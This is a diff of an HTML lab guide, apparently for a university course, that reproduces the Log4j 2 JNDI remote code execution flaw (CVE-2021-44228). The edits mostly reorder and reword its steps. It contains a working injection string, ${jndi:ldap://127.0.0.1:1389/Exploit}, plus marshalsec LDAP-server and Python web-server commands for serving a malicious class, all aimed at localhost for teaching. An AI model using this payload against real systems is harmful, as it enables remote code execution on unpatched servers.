@@ -584,8 +584,7 @@
 <h2 id="3">3.背景知识</h2>
 <h3 id="31-log4j-2">3.1 Log4j 2</h3>
 <p>Apache Log4j 2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。该日志框架被大量用于业务系统开发，用来记录日志信息。
-2021 年 12 月 9 日晚，Log4j 2 的一个远程代码执行漏洞的利用细节被公开。该漏洞 CVE 编号为 CVE-2021-44228，受影响版本为2.0 &lt;= Apache Log4j &lt; 2.15.0-rc1。
-该漏洞的主要原理是 Log4j 2 日志框架提供了一种叫做 <code>lookup</code> 的功能，当日志中包括 <code>${}</code>，<code>lookup</code> 功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。Log4j 2 提供的 <code>lookup</code> 功能支持 JNDI 方式查询。并且在 Log4j 2 中 JNDI 解析是未做限制的，可以直接访问到远程对象，此时远程对象如果是恶意服务的话，那么就会造成注入，也就是说当用户可以控制记录日志时，可以构造恶意字符串来使服务器调用 JNDI 访问恶意对象，从而触发漏洞。</p>
+2021 年 12 月 9 日晚，Log4j 2 的一个远程代码执行漏洞的利用细节被公开。该漏洞 CVE 编号为 CVE-2021-44228，受影响版本为2.0 &lt;= Apache Log4j &lt; 2.15.0-rc1。该漏洞的主要原理是 Log4j 2 日志框架提供了一种叫做 <code>lookup</code> 的功能，当日志中包括 <code>${}</code>，<code>lookup</code> 功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。Log4j 2 提供的 <code>lookup</code> 功能支持 JNDI 方式查询。并且在 Log4j 2 中 JNDI 解析是未做限制的，可以直接访问到远程对象，此时远程对象如果是恶意服务的话，那么就会造成注入，也就是说当用户可以控制记录日志时，可以构造恶意字符串来使服务器调用 JNDI 访问恶意对象，从而触发漏洞。</p>
 <h3 id="32-jndi">3.2 JNDI</h3>
 <p>JNDI（Java Naming and Directory Interface），即 Java 命名和目录接口，它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。其整体架构分层如下图</p>
 <p><img alt="" src="../img/jndi.png" /></p>
@@ -594,7 +593,7 @@
 <li>RMI：java 中的远程方法调用</li>
 <li>LDAP：一个轻量级目录访问协议</li>
 </ul>
-<p>以 LDAP 为例，在复现漏洞实现攻击时，我们可以构建一个以  <code>${</code> 和 <code>}</code>  为开头和结尾的字符串，例如 ${jndi:ldap://127.0.0.1:1389/Exploit} ，Log4j2 会去解析此字符串，通过 JNDI 下的 LDAP 协议请求到本地1389端口下的 Exploit 恶意 class 文件。</p>
+<p>以 LDAP 为例，在复现漏洞实现攻击时，我们可以构建一个以  <code>${</code> 和 <code>}</code>  为开头和结尾的字符串，例如 <code>${jndi:ldap://127.0.0.1:1389/Exploit}</code> ，Log4j2 会去解析此字符串，通过 JNDI 下的 LDAP 协议请求到本地1389端口下的 Exploit 恶意 class 文件。</p>
 <h3 id="33-marshalsec">3.3 marshalsec</h3>
 <p><a href="https://github.com/mbechler/marshalsec">marshalsec</a> 是一款 Java 反序列化利用工具，本次实验使用 marshalsec 来启动 LDAP 服务</p>
 <p>下载完成后在根目录打开 cmd 窗口，执行以下命令打包为 jar</p>
@@ -606,13 +605,12 @@
 <h3 id="34-mysql">3.4 MySQL</h3>
 <p>MySQL 是一个关系型数据库管理系统，是最流行的关系型数据库管理系统之一。</p>
 <p>MySQL 的安装与配置参考<a href="https://www.sjkjc.com/mysql/install-on-windows/">这篇博客</a></p>
-<p>在本实验搭建 Java Web 网站的过程中，需要首先在数据库中新建数据库 <code>wj</code>，进入 <code>wj</code> 后执行命令 <code>source /path/to/wj.sql</code> 即可导入数据库。</p>
 <h3 id="35-redis">3.5 Redis</h3>
 <p>Redis 是一个高性能的 key-value 存储系统，在 4.2 的 Web 应用中会用到，但安装与否不影响实验</p>
 <p>Redis的<a href="https://github.com/tporadowski/redis/releases">安装地址</a></p>
 <h3 id="36-python">3.6 Python</h3>
-<p>实验过程中可能需要使用 python 命令来运行一个 http server，需要在本地配置 python 环境</p>
-<p>python 环境的安装和配置请同学们自行 Google</p>
+<p>实验过程中可能需要使用 python 命令来运行一个 http server，需要在本地配置 python 环境。</p>
+<p>python 环境的安装和配置请同学们自行 Google。</p>
 <h3 id="37-jdk-maven">3.7 JDK 和 Maven</h3>
 <p>注意下载对应操作系统的 JDK, 并将其添加到环境变量。JDK 和 Maven 的配置：</p>
 <ul>
@@ -659,13 +657,13 @@
 </ul>
 <p>我们首先在本地尝试触发 Log4j 2 漏洞，执行一个简单的攻击脚本，打开本地计算器。</p>
 <ul>
-<li>打开 IDEA，导入所给的 Log4j2Vul 项目中的Log4j2Ldap项目</li>
+<li>打开 IDEA，导入所给的 Log4j2Vul 项目中的 Log4j2Ldap 项目</li>
 </ul>
 <blockquote>
 <p>注意此处应导入 Log4j2Ldap 项目，不要导入整个Log4j2Vul</p>
 </blockquote>
 <ul>
-<li>此项目引入的为2.12.1版本</li>
+<li>此项目引入的 Apache Log4j 为2.12.1版本</li>
 </ul>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
@@ -687,14 +685,6 @@
 <span class="w">    </span><span class="nt">&lt;version&gt;</span>2.12.1<span class="nt">&lt;/version&gt;</span>
 <span class="nt">&lt;/dependency&gt;</span>
 </code></pre></div></td></tr></table></div>
-<ul>
-<li>使用3.3中提到的 marshalsec 反序列化工具，启动一个 LDAP 的服务</li>
-</ul>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8100/#Exploit&quot;
-</code></pre></div></td></tr></table></div>
-<blockquote>
-<p>如果这一步报错提示端口被占用，可通过 <code>netstat -ano | findstr "port_number"</code> 查找占用进程，不重要的进程可以直接 kill。如果查找不到占用的进程，参考<a href="https://blog.csdn.net/m0_47696151/article/details/117785566">这篇博客</a>。</p>
-</blockquote>
 <ul>
 <li>完成打开本地计算器的攻击脚本的编写</li>
 </ul>
@@ -732,7 +722,15 @@
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>javac Exploit.java
 </code></pre></div></td></tr></table></div>
 <ul>
-<li>然后在class文件所在目录下启动一个 web 服务，此处建议使用 python 命令启动 web 服务</li>
+<li>使用3.3中提到的 marshalsec 反序列化工具，在 marshalsec 的 target 目录下启动一个 LDAP 服务</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8100/#Exploit&quot;
+</code></pre></div></td></tr></table></div>
+<blockquote>
+<p>如果这一步报错提示端口被占用，可通过 <code>netstat -ano | findstr "port_number"</code> 查找占用进程，不重要的进程可以直接 kill。如果查找不到占用的进程，参考<a href="https://blog.csdn.net/m0_47696151/article/details/117785566">这篇博客</a>。</p>
+</blockquote>
+<ul>
+<li>在 Exploit.class 文件所在目录下启动一个 web 服务，此处建议使用 python 命令启动 web 服务</li>
 </ul>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>python -m http.server 8100
 </code></pre></div></td></tr></table></div>
@@ -824,7 +822,8 @@
 </ul>
 <p>实验步骤：
 + 打开 IDEA，导入所给的 White-Jotter 项目
-+ 参考3.4和3.5在 mysql 中创建数据库 <code>wj</code> ，运行 src/main/resources 目录下的数据库脚本 wj.sql，并启动 Redis 服务。
++ 在 mysql 中创建数据库 <code>wj</code> ，运行 src/main/resources 目录下的数据库脚本 wj.sql。具体方法是，新建数据库 <code>wj</code>，进入 <code>wj</code> 后执行命令 <code>source /path/to/wj.sql</code> 即可导入数据。
++ 启动 Redis 服务（可选）。
 + 修改 src/main/resources 目录下的 application.properties 文件，将数据库用户名和密码以及 Redis 的端口和密码改成自己电脑上对应的端口和密码。</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
